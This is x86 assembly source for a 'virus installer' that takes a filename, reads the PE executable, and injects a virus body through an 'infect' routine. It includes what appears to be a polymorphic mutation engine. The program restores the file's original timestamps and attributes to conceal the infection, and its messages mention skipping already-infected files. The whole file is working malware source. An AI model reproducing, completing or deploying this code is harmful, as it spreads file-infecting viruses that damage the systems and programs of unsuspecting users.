include import.ash

include ..\ldizx\ldizx.ash
include ..\dee\dee.ash
include ..\ltme\ltme.ash
include ..\ltme\list.ash

include ..\macros.ash
include ..\win32api.ash
include ..\pe.ash

includelib import32.lib

        .586p
        .model flat
        .data
errmsg		db 10,13,"  Error: Can't infect file (no/wrong reloc ,already infected",10,13,0
		db "or other internal error)",10,13,0

okmsg		db 10,13,"  Successfully installed",10,13,0

ussage		db 10,13,"Ussage :",10,13
		db	 "           util.exe <filename>",10,13,0

ttlmsg		db 10,13,"Util : virus installer",10,13,0
_file		db 'notepad.exe',0
        .code



;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл
virus_entry     equ     4 ptr[ebp]
temp_param	equ	     [ebp+4]

_start:

                int 3

@virdelta	equ	7					; constants
@virsize	equ	8768                                    ;

                xcall GetCommandLineA
		xchg esi,eax

parse_cmdl:
		lodsb
		or al,al
                jz _error
		
		cmp al,20h
		jne parse_cmdl

                ntsub <SIZE ltmeparam+4>
                mov ebp,esp

                mov temp_param.user_oldvirsize,@virsize
                mov temp_param.user_olddelta,@virdelta

		mov edx,esi

		mov esi,offset ttlmsg
		call printf

		call process_file
_exit:
                push 0
                xcall ExitProcess
_error:

		mov esi,offset ussage
		call printf
		jmp _exit

;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл
;
; In:	EDX=filename offset
;
;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл

process_file:
                pusha

                call fgetattrb
                push eax                                	; get attributes
                push edx

                xor eax,eax                             	;
                call fsetattrb                          	; clear atrributes

                call fopen

                inc ebx                                 	;
                jz process_file_attrib                  	; error ?
                dec ebx                                 	;

                sub esp,3*(SIZE FILETIME)
                mov edi,esp                             	;
                call fgettime                           	; get date/time

;-----------------------------------------------------------------------------

                call fsize
		xchg eax,ecx

		push ecx                                	;
                call malloc                             	; file bufer
		add esp,4                               	; 

		or eax,eax          				; error?
		jz process_file_time                    	;

                xchg edx,eax					; EDX=bufer
                ;ECX=filesize					;
                ;EBX=handle                             	; Read file
                call fread                              	; 

;------------------------------------------------------------------------------

		;EDX=PE file bufer                      	;
		mov edi,ecx					; EDI=filesize
		lea eax,temp_param                      	; EAX=params
		mov ecx,temp_param.user_oldvirsize      	; ECX=virus size
		mov esi,offset virhex				; ESI=entry
                call infect                             	; 

		;EAX = bufer ,ECX=size(or FFFFFFFFh)

                inc ecx
                je process_error
		dec ecx

;------------------------------------------------------------------------------
		xchg edx,eax

		push ecx
                xor eax,eax					; seek
                xor ecx,ecx					;
                call fseek                              	;
		pop ecx


		; EDX= bufer
		; ECX= size
                ; EBX= handle
                call fwrite					; Write

		mov esi,offset okmsg
		call printf

		jmp process_file_time
process_error:
		mov esi,offset errmsg
		call printf


;АААААААААААААААААААААААААААААААААААААААААААААААААААААААААААААААААААААААААААААА
process_file_time:

		;EBX = handle
                mov edi,esp
                call fsettime
                add esp,3*(SIZE FILETIME)

                call fclose

		push edx                                	;
                call free                               	; release new file bufer
		add esp,4                               	;

process_file_attrib:

                pop edx
                pop eax
                call fsetattrb                          	; restore attributes

process_file_exit:

                popa
		ret


;------------------------------------------------------------------------------
include out.inc

include infect.inc

include system.inc
include fio.inc

include ..\ldizx\ldizx.inc
include ..\dee\dee.inc
include ..\rnd\rnd.inc

include mutator.asm
include ..\ltme\ltme_core.inc

include virhex\virhex.inc

end     _start



